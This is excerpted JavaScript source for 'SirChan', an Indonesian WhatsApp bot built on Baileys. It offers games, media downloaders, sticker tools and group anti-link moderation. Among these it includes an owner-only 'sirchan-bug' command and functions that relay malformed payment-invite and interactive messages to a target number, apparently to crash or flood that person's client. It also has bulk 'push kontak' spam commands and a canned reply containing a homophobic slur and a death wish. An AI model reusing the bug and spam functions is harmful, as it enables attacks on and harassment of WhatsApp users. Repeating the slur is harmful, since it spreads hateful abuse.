...
LINK SALURAN GUE 
https://whatsapp.com/channel/0029VaeF18OKgsNpCuDJ4U1F

NOTE : CREDIT JANGAN DI HAPUS KALO DIHAPUS NTAR EROR🗿
*/
...
//total fitur
const totalFitur = () =>{
            var mytext = fs.readFileSync("./sirchan.js").toString()
...
//=================================================//
module.exports = sirchan = async (sirchan, m, chatUpdate, store) => {
try {
var body = (
...
//User
const botNumber = await sirchan.decodeJid(sirchan.user.id)
...
// Group
const groupMetadata = m.isGroup ? await sirchan.groupMetadata(m.chat).catch(e => {}) : ''
...
await sirchan.readMessages([readkey]);
}
sirchan.sendPresenceUpdate('available', m.chat)
if (db.data.settings[botNumber].autoTyping) {
if (m.message) {
sirchan.sendPresenceUpdate('composing', m.chat)
}
}
if (db.data.settings[botNumber].autoRecord) {
if (m.message) {
sirchan.sendPresenceUpdate('recording', m.chat)
}
}
...
await sirchan.updateProfileStatus(`✳️ SIRCHAN - Client By : SirChan || ✅ Runtime : ${uptime}`)
...
if (m.message) {
sirchan.sendPresenceUpdate(jd, m.chat)
}
*/
//=================================================//
...
await sirchan.sendMessage(m.chat, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
...
await sirchan.sendMessage(m.chat, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: m })
...
let { key } = await sirchan.sendMessage(m.chat, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < gen2.length; i++) {
await sleep(10)
await sirchan.sendMessage(m.chat, {text: gen2[i], edit: key });
}
}
...
return sirchan.sendMessage(m.chat, {
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: false,
renderLargerThumbnail: false,
title: `© 𝖲𝗂𝗋𝖢𝗁𝖺𝗇 𝖢𝗅𝗂𝖾𝗇𝗍 𝟣.0.0`,
...
let gclink = (`https://chat.whatsapp.com/`+await sirchan.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return sirchan.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return sirchan.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isDeveloper) return sirchan.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\Owner telah mengirim link, owner bebas memposting link apa pun`})
await sirchan.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
...
/*sirchan.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
sirchan.sendMessage(m.chat, {text:`\`\`\`「 Wa.me Link Terdeteksi 」\`\`\`\n\n@${kice.split("@")[0]} Jangan kirim wa.me link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
}
//antivirtex by geekz and modified by SirChan
  if (AntiVirtex) {
  if (budy.length > 3500) {
...
await sirchan.groupParticipantsUpdate(m.chat, [member[i]], "remove")
await sleep(1000)
}
}
}
//antilink youtube video by geekz and modified by SirChan
...
/*sirchan.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
sirchan.sendMessage(m.chat, {text:`\`\`\`「 YouTube Video Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim youtube video link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by geekz and modified by SirChan
...
/*sirchan.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
sirchan.sendMessage(m.chat, {text:`\`\`\`「 YouTube Channel Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim youtube channel link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink instagram by geekz and modified by SirChan
...
/*sirchan.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
sirchan.sendMessage(m.chat, {text:`\`\`\`「 Instagram Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim instagram link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by geekz and modified by SirChan
if (AntiLinkFacebook)
...
/*sirchan.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
sirchan.sendMessage(m.chat, {text:`\`\`\`「 Facebook Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim facebook link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by geekz and modified by SirChan
if (AntiLinkTelegram)
...
/*sirchan.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
sirchan.sendMessage(m.chat, {text:`\`\`\`「 Telegram Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim telegram link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink tiktok by geekz and modified by SirChan
if (AntiLinkTiktok)
...
/*sirchan.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
sirchan.sendMessage(m.chat, {text:`\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim tiktok link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by geekz and modified by SirChan
if (AntiLinkTwitter)
...
/*sirchan.groupParticipantsUpdate(m.chat, [m.sender], 'remove')sirchan.sendMessage(m.chat, {text:`\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim twitter link di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink all by geekz and modified by SirChan
if (AntiLinkAll)
...
await sirchan.sendText(m.chat, `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉`, m)
delete tebakgambar[m.sender.split('@')[0]]
...
await sirchan.sendText(m.chat, `🎮 Asah Otak 🎮\n\nJawaban Benar 🎉`, m)
delete tebakasahotak[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}
...
await sirchan.sendText(m.chat, `🎮 Siapakah Aku 🎮\n\nJawaban Benar 🎉`, m)
delete tebaksiapakahaku[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}
...
await sirchan.sendText(m.chat, `🎮 Susun Kata 🎮\n\nJawaban Benar 🎉`, m)
delete tebaksusunkata[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}
...
await sirchan.sendText(m.chat, `🎮 Tebak Bendera 🎮\n\nJawaban Benar 🎉`, m)
delete tebakbendera2[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}
...
await sirchan.sendText(m.chat, `🎮 Tebak Kabupaten 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkabupaten[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}
...
await sirchan.sendText(m.chat, `🎮 Tebak Kimia 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkimia[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}
...
await sirchan.sendText(m.chat, `🎮 Teka Teki 🎮\n\nJawaban Benar 🎉`, m)
delete tebaktekateki[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}
...
await sirchan.sendText(m.chat, `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉`, m)
delete tebaklagu[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}
...
await sirchan.sendText(m.chat, `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkata[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}
...
await sirchan.sendText(m.chat, `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkalimat[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}
...
await sirchan.sendText(m.chat, `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉`, m)
delete tebaklirik[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}
...
await sirchan.sendText(m.chat, `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉`, m)
delete tebaktebakan[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}
...
if (room.x !== room.o) sirchan.sendText(room.x, str, m, {
mentions: parseMention(str)
})
sirchan.sendText(room.o, str, m, {
mentions: parseMention(str)
})
if (isTie || isWin) {
...
sirchan.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} telah kembali dari afk`, m)
}
}
...
sirchan.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
...
sirchan.sendText(m.chat, `Suit telah dikirimkan ke chat
...
if (!roof.pilih) sirchan.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) sirchan.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) sirchan.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
sirchan.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
...
if (!roof.pilih2) sirchan.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
joreply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) sirchan.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
...
sirchan.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}
...
await sirchan.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
//=================================================//
async function aipong(target) {
await sirchan.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
//=================================================//
 ...
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        ...
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg" } }, { upload: sirchan.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #sirchandominate"
      },
      nativeFlowMessage: {
...
┃⭔ Type : Case
┃⭔ Status : Ready
┃⭔ Mode : ${sirchan.public ? '✱ Public ༣' : '✲ Self ༣'}
...
┃⊳${prefix}ᴋʜᴜsᴜsᴍᴇɴᴜ φ           
┃⊳${prefix}ᴀʟʟᴍᴇɴᴜ φ
┃⊳${prefix}ᴍᴇɴᴜʙᴜᴛᴛᴏɴ button/ɴᴏɴ φ
┃⊳${prefix}ᴏᴡɴᴇʀ φ
┃⊳${prefix}ʙᴏᴛsᴛᴀᴛᴜs φ
┗━━━━━━━━━━━━━
...
"newsletterName": 'By SirChan-Button',
"serverMessageId": 1
},
},
"header": {
"title": penisbengkok,
...(await prepareWAMessageMedia({ image: mengkece }, { upload: sirchan.waUploadToServer })),
"hasMediaAttachment": true
},
"body": {
"text": ""
...
{
"name": "single_select",
"buttonParamsJson": `{ "title": "𖥻𝖪𝖫𝖨𝖪 𝖡𝖸 𝖲𝖨𝖱𝖢𝖧𝖠𝖭𖥻", "sections": [{ "title": "# !-Choose One Of Them", "highlight_label": "💻General Case🗨️", "rows": [{ "header": "ALL CASE", "title": "Show All Case", "id": ".allmenu" }, { "header": "Owner", "title": "Displays Owner Number", "id": ".owner" }, { "header": "Bot Info", "title": "Displays Information About Bots", "id": ".botstatus" }] }, { "title": "☰ Khusus - Case ☰", "highlight_label": " #khusus ", "rows": [{ "header": "Special - Menu", "title": "displays all khusus Case", "id": ".khususmenu" }] }] }`
},
{
"name": "cta_url",
...
sirchan.sendMessage(m.chat, kontollurus, { quoted: m })
} else if ( db.data.settings[botNumber].menuType === 'buttonImage') {
sirchan.relayMessage(m.chat, freesex, {})
}
...
┏━▓   \`Owner Menu\` ▓━
┃
┃彡 ${prefix}Addprem 62##/TAG 30d
┃彡 ${prefix}Dellprem 62##/TAG 30d
┃彡 ${prefix}addowner 62878####
┃彡 ${prefix}delowner 62878####
┃彡 ${prefix}sirchan-bug 62878####
┃彡 ${prefix}addbadwords kata kasar
┃彡 ${prefix}delbadwords kata kasar
┃彡 ${prefix}menubutton on/off
┃彡 ${prefix}autoread on/off
┃彡 ${prefix}autotyping on/off
┃彡 ${prefix}autorecord on/off
┃彡 ${prefix}autobio on/off
┃彡 ${prefix}self
┃彡 ${prefix}public
┃彡 ${prefix}shutdown
┃彡 ${prefix}addcase 
┃彡 ${prefix}delcase
┃彡 ${prefix}join [link group]
┃彡 ${prefix}block [nomor]
┃彡 ${prefix}unblock [nomor]
┃彡 ${prefix}listblock
┃彡 ${prefix}setppbot [reply gambar]
┃彡 ${prefix}setbiobot [teks]
┃彡 ${prefix}listpc
┃彡 ${prefix}restart
┃
┗━━━━━━━━━━━▓
...
┃ஐ ${prefix}kolam 
┃ஐ ${prefix}koboy 
┃ஐ ${prefix}leaderboard 
┃
┗━━━━━━━━━━━━━▓

┏━▓   \`Convert\` ▓━
┃
┃𒋨 ${prefix}toimg | reply stiker
┃𒋨 ${prefix}toaudio | reply video
┃𒋨 ${prefix}sticker | reply gambar
┃𒋨 ${prefix}s | reply gambar 
┃𒋨 ${prefix}smeme teks bawah|teks atas
┃𒋨 ${prefix}tomp4 (sedang eror)
┃𒋨 ${prefix}kalkulator 
┃𒋨 ${prefix}removebg | reply gambar
┃𒋨 ${prefix}wm | reply stiker
┃𒋨 ${prefix}attp teks
┃𒋨 ${prefix}styletext teks
┃𒋨 ${prefix}cekkhodam
┃
┗━━━━━━━━━━━▓
...
┃
┃π ${prefix}kisahnabi
┃π ${prefix}asmaulhusna
┃π ${prefix}bacaansholat
┃π ${prefix}ayatkursi
┃π ${prefix}doaharian
┃π ${prefix}niatsholat
┃π ${prefix}quotesislami
┃π ${prefix}doatahlil
┃
┗━━━━━━━━━━━▓ 
...
┏━▓   \`Group\` ▓━
┃
┃𖧶 ${prefix}setppgroup reply gambar
┃𖧶 ${prefix}promote tag
┃𖧶 ${prefix}demote tag
┃𖧶 ${prefix}kick tag
┃𖧶 ${prefix}add nomor
┃𖧶 ${prefix}editgroup open/close
┃𖧶 ${prefix}editsubjek teks 
┃𖧶 ${prefix}editinfo teks
┃𖧶 ${prefix}editdesk teks
┃𖧶 ${prefix}clearchat
┃𖧶 ${prefix}resetlinkgc
┃𖧶 ${prefix}revoke
┃𖧶 ${prefix}infogc
┃𖧶 ${prefix}getppgc
┃𖧶 ${prefix}closegroup
...
┃𖧶 ${prefix}tagall
┃𖧶 ${prefix}linkgc
┃𖧶 ${prefix}antitoxic on / off
┃𖧶 ${prefix}antiasing on / off
┃𖧶 ${prefix}antivirtex on / off
┃𖧶 ${prefix}antilinkall on / off
┃𖧶 ${prefix}antilinkfb on / off
┃𖧶 ${prefix}antilinkyt on / off
┃𖧶 ${prefix}antilinkytch on / off
┃𖧶 ${prefix}antilinkig on / off
┃𖧶 ${prefix}antilinktele on / off
┃𖧶 ${prefix}antilinktiktok on / off
┃𖧶 ${prefix}antilinktwitter on / off
┃𖧶 ${prefix}antilink on / off
┃
┗━━━━━━━━━━━▓ 

┏━▓   \`Download\` ▓━
┃
┃𖦏 ${prefix}gitclone url
┃𖦏 ${prefix}mediafire url
┃𖦏 ${prefix}tiktokmp3 url
┃𖦏 ${prefix}tiktokvideo url
┃𖦏 ${prefix}ytmp4 url
┃𖦏 ${prefix}ytmp3 url
┃𖦏 ${prefix}play judul
┃𖦏 ${prefix}playmusic judul
┃𖦏 ${prefix}douyindl url
┃𖦏 ${prefix}igdlimage url
┃𖦏 ${prefix}igdlmp4 url
┃𖦏 ${prefix}pintmp4 url
┃𖦏 ${prefix}happymod nama apk
┃
┗━━━━━━━━━━━▓ 
...
┃𖦳 ${prefix}suitpvp
┃𖦳 ${prefix}kuismath
┃𖦳 ${prefix}tebak gambar
┃𖦳 ${prefix}tebak kata
┃𖦳 ${prefix}tebak kalimat
┃𖦳 ${prefix}tebak lirik
┃𖦳 ${prefix}tebak tebakan
┃𖦳 ${prefix}tebak bendera
┃𖦳 ${prefix}tebak bendera2
┃𖦳 ${prefix}tebak kabupaten
┃𖦳 ${prefix}tebak kimia
┃𖦳 ${prefix}tebak asahotak
┃𖦳 ${prefix}tebak siapakahaku
┃𖦳 ${prefix}tebak susunkata
┃𖦳 ${prefix}tebak tekateki
┃
┗━━━━━━━━━━━▓ 

┏━▓   \`PhotoOxy\` ▓━
┃
┃𖦴 ${prefix}shadow namalu 
┃𖦴 ${prefix}write namalu 
┃𖦴 ${prefix}romantic namalu 
┃𖦴 ${prefix}burnpaper namalu
┃𖦴 ${prefix}smoke namalu 
┃𖦴 ${prefix}narutobanner namalu 
┃𖦴 ${prefix}love namalu 
┃𖦴 ${prefix}undergrass namalu
┃𖦴 ${prefix}doublelove namalu 
┃𖦴 ${prefix}coffecup namalu
┃𖦴 ${prefix}underwaterocean namalu
┃𖦴 ${prefix}smokyneon namalu
┃𖦴 ${prefix}starstext namalu
┃𖦴 ${prefix}rainboweffect namalu
┃𖦴 ${prefix}balloontext namalu
┃𖦴 ${prefix}metalliceffect namalu
┃𖦴 ${prefix}embroiderytext namalu
┃𖦴 ${prefix}flamingtext namalu
┃𖦴 ${prefix}stonetext namalu
┃𖦴 ${prefix}writeart namalu
┃𖦴 ${prefix}summertext namalu
┃𖦴 ${prefix}wolfmetaltext namalu
┃𖦴 ${prefix}nature3dtext namalu
┃𖦴 ${prefix}rosestext namalu
┃𖦴 ${prefix}naturetypography namalu
┃𖦴 ${prefix}quotesunder namalu
┃𖦴 ${prefix}shinetext namalu
┃
┗━━━━━━━━━━━▓ 
...
┃𖥻 ${prefix}Ramaljodoh
┃𖥻 ${prefix}Ramalcinta
┃𖥻 ${prefix}Ramaljodohbali
┃𖥻 ${prefix}Suamiistri
┃𖥻 ${prefix}Cocoknama
┃𖥻 ${prefix}Pasangan
┃𖥻 ${prefix}Jadiannikah
┃𖥻 ${prefix}Sifatusaha
┃𖥻 ${prefix}Rezeki
┃𖥻 ${prefix}Pekerjaan
┃𖥻 ${prefix}Nasib
...
┃𖥻 ${prefix}Nagahari
┃𖥻 ${prefix}Arahrezeki
┃𖥻 ${prefix}Peruntungan
┃𖥻 ${prefix}Weton
┃𖥻 ${prefix}Karakter
┃𖥻 ${prefix}Keberuntungan
┃𖥻 ${prefix}Masasubur
┃𖥻 ${prefix}Memancing
┃𖥻 ${prefix}Zodiak
┃𖥻 ${prefix}Shio
...
┏━▓   \`Push Renk\` ▓━
┃
┃ஐ ${prefix}pushkontakidgc idgc|teksny
┃ஐ ${prefix}pushkontakv1 idgc|teksnya
┃ஐ ${prefix}pushkontakv2 teks
┃ஐ ${prefix}pushkontakv3 replyimg|teks
┃ஐ ${prefix}savecontact idgc
┃ஐ ${prefix}jpm replyimg|teks
┃
┗━━━━━━━━━━━▓ 

┏━▓   \`Ephoto 360\` ▓━
┃
┃𖧶 ${prefix}glitchtext namalu
┃𖧶 ${prefix}writetext namalu
┃𖧶 ${prefix}advancedglow namalu
┃𖧶 ${prefix}typographytext namalu
┃𖧶 ${prefix}pixelglitch namalu
┃𖧶 ${prefix}neonglitch namalu
┃𖧶 ${prefix}flagtext namalu
┃𖧶 ${prefix}flag3dtext namalu
┃𖧶 ${prefix}deletingtext namalu
┃𖧶 ${prefix}blackpinkstyle namalu
┃𖧶 ${prefix}glowingtext namalu
┃𖧶 ${prefix}underwatertext namalu
┃𖧶 ${prefix}logomaker namalu
┃𖧶 ${prefix}cartoonstyle namalu
┃𖧶 ${prefix}papercutstyle namalu
┃𖧶 ${prefix}watercolortext namalu
┃𖧶 ${prefix}effectclouds namalu
┃𖧶 ${prefix}blackpinklogo namalu
┃𖧶 ${prefix}gradienttext namalu
┃𖧶 ${prefix}summerbeach namalu
┃𖧶 ${prefix}luxurygold namalu
┃𖧶 ${prefix}multicoloredneon namalu
┃𖧶 ${prefix}sandsummer namalu
┃𖧶 ${prefix}galaxywallpaper namalu
┃𖧶 ${prefix}1917style namalu
┃𖧶 ${prefix}makingneon namalu
┃𖧶 ${prefix}royaltext namalu
┃𖧶 ${prefix}freecreate namalu
┃𖧶 ${prefix}galaxystyle namalu
...
{
"name": "cta_url",
"buttonParamsJson": "{\"display_text\":\"Saluran WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VaeF18OKgsNpCuDJ4U1F\",\"merchant_url\":\"https://whatsapp.com/channel/0029VaeF18OKgsNpCuDJ4U1F\"}"
}
],
"messageParamsJson": ""
}
...
sirchan.relayMessage(m.chat, msg, {})
}
}
break
//=================================================//
case "menugroup": case "menugrup": {
let jinjing = [nulll, nulll2]
let randomIndex = Math.floor(Math.random() * jinjing.length)
let mydick = jinjing[randomIndex]
let itsmenu = `
...
break
//=================================================//
case "menuislamic": case "menuislam": {
let jinjing = [nulll, nulll2]
let randomIndex = Math.floor(Math.random() * jinjing.length)
let mydick = jinjing[randomIndex]
let itsmenu = `
...
break
//=================================================//
case "openaimenu": case "menuopenai": {
let jinjing = [nulll, nulll2]
let randomIndex = Math.floor(Math.random() * jinjing.length)
let mydick = jinjing[randomIndex]
let itsmenu = `
...
break
//=================================================//
case "menupushkon": case "pushkonmenu": {
let jinjing = [nulll, nulll2]
let randomIndex = Math.floor(Math.random() * jinjing.length)
let mydick = jinjing[randomIndex]
let itsmenu = `
...
break
//=================================================//
case "menuscrape": case "scrapemenu": {
let jinjing = [nulll, nulll2]
let randomIndex = Math.floor(Math.random() * jinjing.length)
let mydick = jinjing[randomIndex]
let itsmenu = `
...
break
//=================================================//
case "menuphotoxy": case "photoxymenu": {
let jinjing = [nulll, nulll2]
let randomIndex = Math.floor(Math.random() * jinjing.length)
let mydick = jinjing[randomIndex]
let itsmenu = `
...
break
//=================================================//
case "menurandom": case "randommenu": {
let jinjing = [nulll, nulll2]
let randomIndex = Math.floor(Math.random() * jinjing.length)
let mydick = jinjing[randomIndex]
let itsmenu = `
...
penis = fs.readFileSync("./sirchan.js").toString(),
...
//=================================================//
case 'sc': case 'script': {
joreply(`Sc Ini Dibuat Oleh SirChan.
`)
}
break
//=================================================//
...
"contactMessage": {
"displayName": `${namaown}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${global.ownMain}:+${global.ownMain}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:[[ ༑ 𝐒𝐢𝐫𝐂𝐡𝐚𝐧 ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nX-WA-BIZ-NAME: [[ ༑ 𝐒𝐢𝐫𝐂𝐡𝐚𝐧 ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nEND:VCARD`,
}
}), { userJid: m.chat, quoted: m })
sirchan.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
break
//=================================================//
case 'assalamualaikum': {
sirchan.sendMessage(m.chat, { text: `waalaikumsalam`}, { quoted: m })
}
break
//=================================================//
...
sirchan.sendMessage(m.chat, { text: `kenapa?`}, { quoted: sirbug })
}
break
*/
case 'shutdown': {
...
var name = await sirchan.getName(q)
}
joreply(name)
} else {
joreply(m.pushName)
...
if (Input) {
try {
var ppWong = await sirchan.profilePictureUrl(Input, "image")
} catch {
var ppWong = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
}
sirchan.sendMessage(m.chat, { image: { url: ppWong }}, { quoted: m })
} else {
try {
var ppWong = await sirchan.profilePictureUrl(m.sender, "image")
} catch {
var ppWong = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
}
sirchan.sendMessage(m.chat, { image: { url: ppWong }}, { quoted: m })
...
await sirchan.groupAcceptInvite(result).then((res) => joreply(jsonformat(res))).catch((err) => joreply(jsonformat(err)))
}
break
//=================================================//
case 'self': {
if (!isDeveloper) return joreply(mess.owner)
sirchan.public = false
joreply('succes')
}
break
//=================================================//
...
if(users){
await sirchan.updateBlockStatus(users, "block")
...
await sirchan.updateBlockStatus(woke, "block")
} else if(!q){
...
if(isGroup){
if(users){
await sirchan.updateBlockStatus(users, "unblock")
...
if(woke.startsWith("08")) return joreply("Awali nomer dengan 62")
if(!woke.startsWith("62")) return joreply("Silakan reply pesan atau tag atau input nomer yang mau di block")
await sirchan.updateBlockStatus(woke, "unblock")
...
//=================================================//
case 'listblock':{
let block = await sirchan.fetchBlocklist()
...
if (!isDeveloper) return joreply(mess.owner);
if(m.quoted){
const media = await sirchan.downloadAndSaveMediaMessage(quoted)
const { img } = await generateProfilePicture(media)
await sirchan.query({ tag: 'iq',  attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})   
...
case 'delppbot': {
if (!isDeveloper) return joreply(mess.owner);
sirchan.removeProfilePicture(sirchan.user.id)
joreply(mess.succes)
}
break
//=================================================//
...
await sirchan.updateProfileStatus(q)
...
let fileContent = fs.readFileSync("./sirchan.js", "utf-8");
...
fs.writeFileSync("./sirchan.js", fileContent, "utf-8");
...
//=================================================//
case 'inisir' : {
sirchan.sendMessage(m.chat, { text: `_sir itu ganteng banget, aku jdi suka ama dia 😣😖😫_` }, { quoted: m })
}
break
//=================================================//
case 'terkentod' : {
sirchan.sendMessage(m.chat, { text: `Hoekkkkkkk🤮🤮🤮. najis ada gay, mati aja lu kontol🤢` }, { quoted: m })
}
break
//=================================================//
case "emojimix": {
...
let encmedia = await sirchan.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
...
for (let res of anu.results) {
let encmedia = await sirchan.sendImageAsSticker(m.chat, res.url, m, { packname: pushname, author: author, categories: res.tags })
await fs.unlinkSync(encmedia);
}
}
break
...
let encmedia = await sirchan.sendImageAsSticker(m.chat, media, m, {
...
let media = await quoted.download()
let encmedia = await sirchan.sendVideoAsSticker(m.chat, media, m, {
packname: global.packname,
author: global.author
})
} else {
...
let dwnld = await sirchan.downloadAndSaveMediaMessage(qmsg)
...
let pop = await sirchan.sendImageAsSticker(m.chat, smeme, m, {
packname: global.packname,
author: global.author
})
fs.unlinkSync(pop)
...
joreply(mess.wait)
let media = await sirchan.downloadAndSaveMediaMessage(qmsg)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return err
let buffer = fs.readFileSync(ran)
sirchan.sendMessage(m.chat, {
image: buffer
}, {
quoted: m
})
...
joreply(mess.wait)
var media = await sirchan.downloadAndSaveMediaMessage(quoted, new Date * 1)
let webpToMp4 = await webp2mp4File(media)
sirchan.sendMessage(m.chat, { video: {url: webpToMp4.result}, caption: 'Convert Sticker To Video'}, { quoted: m })
...
joreply(mess.wait)
let media = await sirchan.downloadMediaMessage(qmsg)
...
if (!text) return joreply(`*Example: ${prefix+command} https://instagram.com/sirchan*`)
...
sirchan.sendMessage(m.chat, { image: proses, caption: '_Maaf Kak, Kalau Hasilnya Nggak Bagus_ T_T'}, { quoted: m })
}
break
//=================================================//
...
sirchan.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => joreply(err))
}   
break
//=================================================//
case 'mediafire': {
...
▢ *Uploaded:* ${aploud}
`.trim()
sirchan.sendMessage(m.chat, { document : { url : url}, fileName : filename, mimetype: ext }, { quoted : m })
}
break
//=================================================//
case 'igdlmp4': {
...
sirchan.sendMessage(m.chat, { contextInfo: { externalAdReply: { showAdAttribution: false, 
title: `${res.title}`,
body: `${week} ${calender}`,
mediaType: 2,  
...
sirchan.sendMessage(m.chat, { video: { url: data.nowm }}, { quoted: m })
})
}
break
//=================================================//
...
await joreply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
sirchan.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
//=================================================//
...
joreply(mess.wait)
if (/image/.test(mime)) {
let media = await sirchan.downloadMediaMessage(quoted)
let encmedia = await sirchan.sendImageAsSticker(m.chat, media, m, { packname: `${teks1 ? teks1 : global.packname}`, author: `${teks2 ? teks2 : global.author}`  })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return joreply('Maksimal 10 detik!')
let media = await sirchan.downloadMediaMessage(qmsg)
let encmedia = await sirchan.sendVideoAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
} else {
return joreply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
...
//=================================================//
case 'totalfitur':
reply(`_Total Semua Fitur ᴀᴢɪᴢ ᴏғғɪᴄɪᴀʟ 𝙱𝙾𝚃𝚂 ${totalFitur()}_`)
        break
//=================================================//
case 'txt2img':{
...
await sirchan.sendMessage(m.chat, {image: txt, caption: `Done Sayang`},{quoted: m})
 } catch (e) {
...
sirchan.sendFile(m.chat, hasil, 'anu.jpg', `Prompt: ${text}`, m)
}
break
//=================================================//
case "prompt-gpt": {
...
sirchan.sendMessage(m.chat, { image: { url: json.result[0].url }, caption: capt }, { quoted: m })
} else {
